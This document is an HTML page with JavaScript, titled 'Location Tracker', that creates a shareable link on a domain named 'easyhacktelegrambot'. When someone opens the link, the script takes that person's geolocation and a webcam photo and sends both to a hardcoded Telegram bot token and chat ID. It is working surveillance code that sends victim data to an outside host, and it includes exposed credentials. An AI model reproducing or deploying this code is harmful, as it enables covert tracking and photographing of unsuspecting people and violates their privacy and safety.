<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        #video { display: none; width: 100%; max-width: 400px; }
        #canvas { display: none; }
        #status { margin: 20px; }
    </style>
</head>
<body>
    <h1>Location Tracker</h1>
    <p id="status">Waiting for permissions...</p>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "7766871169:AAHWWs9KpQl_b3hVOkKWLnU66XFpYBo3hD8";
        const chatId = "1127560386"; // Your provided chat ID
        const telegramApi = `https://api.telegram.org/bot${botToken}`;
        const baseUrl = "https://easyhacktelegrambot.vercel.app";

        const uniqueId = Math.random().toString(36).substring(2, 10); // Generate random ID
        const trackingLink = `${baseUrl}/track/${uniqueId}`; // Unique link
        console.log("Share this link:", trackingLink); // Log for testing

        // Check if the URL contains the unique ID (i.e., link was opened)
        if (window.location.pathname.includes("/track/")) {
            // Request geolocation
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude } = position.coords;
                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    document.getElementById("status").textContent = "Location captured! Now capturing photo...";

                    // Send location to Telegram
                    fetch(`${telegramApi}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`, {
                        method: "POST"
                    }).catch(error => console.error("Error sending location:", error));

                    // Send Google Maps link
                    fetch(`${telegramApi}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(googleMapsLink)}`, {
                        method: "POST"
                    }).catch(error => console.error("Error sending message:", error));

                    // Request camera access and capture photo
                    const video = document.getElementById("video");
                    const canvas = document.getElementById("canvas");
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then((stream) => {
                            video.srcObject = stream;
                            setTimeout(() => {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext("2d").drawImage(video, 0, 0);
                                const photoDataUrl = canvas.toDataURL("image/jpeg");

                                // Stop the video stream
                                stream.getTracks().forEach(track => track.stop());

                                // Send photo to Telegram
                                const formData = new FormData();
                                formData.append("chat_id", chatId);
                                formData.append("photo", dataURLtoBlob(photoDataUrl), "photo.jpg");

                                fetch(`${telegramApi}/sendPhoto`, {
                                    method: "POST",
                                    body: formData
                                })
                                .then(response => response.json())
                                .then(data => {
                                    if (data.ok) {
                                        document.getElementById("status").textContent = "Data sent to Telegram!";
                                    } else {
                                        document.getElementById("status").textContent = "Error: " + data.description;
                                    }
                                })
                                .catch(error => {
                                    document.getElementById("status").textContent = "Error sending photo: " + error;
                                });
                            }, 2000); // Capture photo after 2 seconds
                        })
                        .catch(error => {
                            document.getElementById("status").textContent = "Camera access denied: " + error;
                        });
                },
                (error) => {
                    document.getElementById("status").textContent = "Geolocation denied: " + error.message;
                }
            );
        } else {
            document.getElementById("status").textContent = "Share this link with someone: " + trackingLink;
        }

        // Helper function to convert base64 data URL to Blob
        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(",");
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }
    </script>
</body>
</html>
